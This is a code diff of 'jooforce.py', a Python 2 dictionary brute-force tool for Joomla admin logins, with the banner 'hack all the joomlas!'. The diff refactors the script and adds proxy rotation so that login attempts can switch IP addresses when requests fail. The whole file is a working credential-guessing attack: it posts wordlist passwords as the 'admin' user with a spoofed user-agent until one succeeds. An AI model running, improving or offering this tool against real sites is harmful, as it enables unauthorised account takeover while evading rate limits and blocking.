@@ -19,139 +19,160 @@ import sys
 import urllib
 import urllib2
 
-
 INVALID_LOGIN_CONST = "Use a valid username and password to gain access"
 
-class ProxyStack:
-    file_path=""
-    raw_data = [] # raw data read in from txt file
-    proxies = [] # proxies
-    curr_index = 0
+
+class ProxyList:
+    """Provides access to a list of proxies"""
+    file_path = ""
+    proxies = []
+    current_index = 0
     
-    def __init__(self,filep):
-        self.file_path = filep
+    def __init__(self, file_path):
+        self.file_path = file_path
+        self.parse()
         
     def parse(self):
         try:
-            with open(self.file_path,'r') as f:
-                self.raw_data = (f.readlines())
-                for row in self.raw_data:
-                    if not ":" in row:
-                        row = row.rstrip() + ':80'                    
-                    self.proxies.append(row.rstrip()) # strip out /n chars using row.rstrip
+            with open(self.file_path, "r") as f:
+                data = (f.readlines())
+                for line in data:
+                    if (not ":" in line):
+                        line = line.rstrip() + ':80'                    
+                    self.proxies.append(line.rstrip())
         except IOError:
-               print( "Failed to open proxy list : %s\n" % (self.file_path) )
+               print("  [!] The proxy list could not be opened. Check the path and try again.")
                        
-    def getRandomProxy(self):
-        x = len(self.proxies)
-        index = random.randint(0,x)
-        if not index == self.curr_index:
-            self.curr_index = index
-            index = 0
-            return self.proxies[self.curr_index - 1]
+    def get_random_proxy(self):
+        proxy_count = len(self.proxies)
+        index = random.randint(0, proxy_count - 1)
+        return self.proxies[index]
+
+    def get_next_proxy(self):
+        if (self.current_index < (len(self.proxies) - 1)):
+            self.current_index += 1
         else:
-            return self.getRandomProxy()
+            self.current_index = 0;
+        return self.proxies[self.current_index]
 
-    def getProxy(self):
-        if self.curr_index < len(self.proxies) :
-            self.curr_index = self.curr_index + 1
-            return self.proxies[self.curr_index - 1]
-
+            
 class HttpPostRequest:
-	"""A class that posts data to a URL via HTTP"""
-	url = ""
-	headers = ""
-	post_data = ""
-	
-	def __init__(self, url = "", headers = {}, post_data = {}):
-		self.url = url
-		self.headers = headers
-		self.post_data = post_data
+    """A class that posts data to a URL via HTTP"""
+    url = ""
+    headers = ""
+    post_data = ""
+    proxy_list = None
+    proxy_address = None
+    
+    def __init__(self, url = "", headers = {}, post_data = {}):
+        self.url = url
+        self.headers = headers
+        self.post_data = post_data
 
-	def addHeader(self, key, value):
-		self.headers[key] = value
+    def add_header(self, key, value):
+        self.headers[key] = value
 
-	def addPostField(self, key, value):
-		self.post_data[key] = value
+    def add_post_field(self, key, value):
+        self.post_data[key] = value
 
-	def getResponse(self):
-		data = urllib.urlencode(self.post_data)
-		req = urllib2.Request(self.url, data, self.headers)
-		response_body = ""
+    def get_response(self):
+        data = urllib.urlencode(self.post_data)
+        request = urllib2.Request(self.url, data, self.headers)
+        response_body = ""
 
-		try:
-			response = urllib2.urlopen(req)
-			response_body = response.read()
-		except:
-			print "  [!] WARNING: An error occurred when posting to the page."
-			print "               Further requests may lead to false positives."
-			print ""
-			print "               Do you want to continue? [yes/no]"
-			user_response = raw_input("            --> ")
+        try:
+            if (self.proxy_address != None):
+                urllib2.install_opener(
+                    urllib2.build_opener(
+                        urllib2.ProxyHandler({'http': self.proxy_address})
+                        )
+                    )
 
-			if (user_response.strip().startswith("y")):
-				response_body = INVALID_LOGIN_CONST
-			else:
-				response_body = None	
+            response = urllib2.urlopen(request)
+            response_body = response.read()
+        except:
+            if (isinstance(self.proxy_list, ProxyList)):
+                self.proxy_address = self.proxy_list.get_next_proxy()
+                if (self.proxy_list.current_index == 0):
+                    print "  [!] WARNING: The proxy list has been exhausted."
+                    print "               Do you want to revert to no-proxy mode? [yes/no]"
+                    user_response = raw_input("            --> ")
 
-		return response_body
+                    if (user_response.strip().startswith("y")):
+                        self.proxy_list = None
+                        self.proxy_address = None
+                        return self.get_response()
+                    else:
+                        return self.get_response()
+                else:
+                    print "  [+] Switching proxy to {0}...".format(self.proxy_address)
+                    return self.get_response()
+            else:
+                print "  [!] WARNING: An error occurred when posting to the page."
+                print "               Further requests may lead to false positives."
+                print "               Do you want to continue? [yes/no]"
+                user_response = raw_input("            --> ")
+            
+                if (user_response.strip().startswith("y")):
+                    response_body = INVALID_LOGIN_CONST
+                else:
+                    response_body = None    
+        return response_body
+
 
 class JooForce:
-	"""A class to provide the brute forcing functionality"""
-	path = ""
-	username = ""
-	user_agent = ""
-	verbose = False
-	request = HttpPostRequest()
+    """A class to provide the brute forcing functionality"""
+    path = ""
+    username = ""
+    user_agent = ""
+    verbose = False
+    request = HttpPostRequest()
 
-	def __init__(self, path, url, username = None, user_agent = None):
-		self.path = path
-		self.request.url = url
+    def __init__(self, path, url, username = None, user_agent = None):
+        self.path = path
+        self.request.url = url
+        if (username == None):
+            self.username = "admin"
+        else:
+            self.username = username
+        if ((user_agent == None) or (user_agent.strip() == "")):
+            self.user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
+        else:
+            self.user_agent = user_agent
+        self.request.add_header("User-Agent", self.user_agent)
 
-		if (username == None):
-			self.username = "admin"
-		else:
-			self.username = username
+    def start(self):
+        print "  [+] Starting dictionary attack..."
+        try:
+            with open(self.path) as f:
+                for line in f:
+                    password = line.rstrip()
+                    
+                    if (self.verbose):
+                        print "  [-] Trying {0}:{1}".format(self.username, password)
+                        
+                    values = {'username' : self.username, 'passwd' : password}
+                    self.request.post_data = values
+                    response = self.request.get_response()
 
-		if ((user_agent == None) or (user_agent.strip() == "")):
-			self.user_agent = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
-		else:
-			self.user_agent = user_agent
-			
-		self.request.addHeader("User-Agent", self.user_agent)
-
-	def start(self):
-		print "  [+] Starting dictionary attack..."
-		try:
-			with open(self.path) as f:
-				for line in f:
-					password = line.rstrip()
-					
-					if (self.verbose):
-						print "  [-] Trying {0}:{1}".format(self.username, password)
-						
-					values = {'username' : self.username, 'passwd' : password}
-					self.request.post_data = values
-					response = self.request.getResponse()
-
-					if (response == None):
-						print "  [-] Operation cancelled!"
-						print ""
-						return
-					else:
-						if not INVALID_LOGIN_CONST in response:
-							print ""
-							print "  --------------------------------"
-							print ""
-							print "  [+] Login found!"
-							print "  [-] Password is: " + password
-							print ""
-			  				return	
-		except (IOError) as e:
-			print ""
-			print "  [!] The dictionary could not be opened. Check the path and try again."
-			print ""
-		
+                    if (response == None):
+                        print "  [-] Operation cancelled!"
+                        print ""
+                        return
+                    else:
+                        if not INVALID_LOGIN_CONST in response:
+                            print ""
+                            print "  --------------------------------"
+                            print ""
+                            print "  [+] Login found!"
+                            print "  [-] Password is: " + password
+                            print ""
+                            return    
+        except (IOError) as e:
+            print ""
+            print "  [!] The dictionary could not be opened. Check the path and try again."
+            print ""
+        
 
 print('')
 print('')
@@ -168,69 +189,66 @@ print('    d88P                                    hack all the joomlas! ')
 print('  888P"                                                           ')
 print('')
 print('')
-print('  [-] Usage: python jooforce.py --url --user --dic [-vh --useragent]')
-print('      ---------------------------------------------------------------')
-print('      --dic       : the password dictionary to brute force with      ')
-print('      -h          : display this information                         ')
-print('      --url       : the URL of the Joomla login page                 ')
-print('      --user      : the username to attempt to login as              ')
-print('      --useragent : the user-agent string to post                    ')
-print('      -v          : enable verbose output                            ')
-print('      --p <path>  : point to the proxy list file                     ')
-print('      -r          : randomise proxy selection                        ')
+print('  [-] Usage: python jooforce.py --url example.com --user admin --dic foo.txt')
+print('      ----------------------------------------------------------------------')
+print('      --agent <agent>  : the user-agent string to post                     ')
+print('      --dic <path>      : the password dictionary to brute force with       ')
+print('      -h                : display this information                          ')
+print('      --proxies <path>  : the list of proxies to alternate between          ')
+#print('      -r                : randomise proxy selection                         ')
+print('      --url <url>       : the URL of the Joomla login page                  ')
+print('      --user <user>     : the username to attempt to login as               ')
+print('      -v                : enable verbose output                             ')
 print('')
 print('')
 
-verboseMode = False
-isRandom = False
-dictionaryPath = None
-proxypath = None
+verbose_mode = False
+random_proxy_selection = False
+dictionary_path = None
+proxy_path = None
 url = None
 user = None
-useragent = None
+user_agent = None
 
 arg_index = 0
 for arg in sys.argv:
-	if (arg == "-v" or arg == "-V"):
-		verboseMode = True
-	elif (arg == "-h"):
-		sys.exit(0)
-	elif (arg == "--dic"):
-		dictionaryPath = sys.argv[arg_index + 1]
-	elif (arg == "--url"):
-		url = sys.argv[arg_index + 1]
-	elif (arg == "--user"):
-		user = sys.argv[arg_index + 1]
-	elif (arg == "--useragent"):
-		useragent = sys.argv[arg_index + 1]
-	elif (arg=="--p"):
-		proxyPath = sys.argv[arg_index +1]
-	elif (arg=="-r"):
-		isRandom = True
-	arg_index = arg_index + 1
-		
+    if (arg == "-v" or arg == "-V"):
+        verbose_mode = True
+    elif (arg == "-h"):
+        sys.exit(0)
+    elif (arg == "--dic"):
+        dictionary_path = sys.argv[arg_index + 1]
+    elif (arg == "--url"):
+        url = sys.argv[arg_index + 1]
+    elif (arg == "--user"):
+        user = sys.argv[arg_index + 1]
+    elif (arg == "--useragent"):
+        user_agent = sys.argv[arg_index + 1]
+    elif (arg=="--proxies"):
+        proxy_path = sys.argv[arg_index +1]
+    elif (arg=="-r"):
+        random_proxy_selection = True
+    arg_index = arg_index + 1
 
 errors = []
-
-if (dictionaryPath == None):
-	errors.append("  [-] No dictionary path specified.")
-
+if (dictionary_path == None):
+    errors.append("  [-] No dictionary path specified.")
 if (url == None):
-	errors.append("  [-] No URL specified.")
-
+    errors.append("  [-] No URL specified.")
 if (user == None):
-	errors.append("  [-] No username specified.")
-
+    errors.append("  [-] No username specified.")
 if (len(errors) > 0):
-	print "  [!] One or more required parameters are missing (see below)."
-	for error in errors:
-		print error
-	print ""
+    print "  [!] One or more required parameters are missing (see below)."
+    for error in errors:
+        print error
+    print ""
 else:
-	o = JooForce(dictionaryPath, url, user)
-	o.verbose = verboseMode
-
-	if (useragent != None):
-		o.user_agent = useragent
-	
-	o.start()
+    o = JooForce(dictionary_path, url, user)
+    o.verbose = verbose_mode
+    if (proxy_path != None):
+        o.request.proxy_list = ProxyList(proxy_path)
+        print "  [+] Setting proxy to {0}...".format(o.request.proxy_list.proxies[0])
+        o.request.proxy_address = o.request.proxy_list.proxies[0]
+    if (user_agent != None):
+        o.user_agent = user_agent
+    o.start()
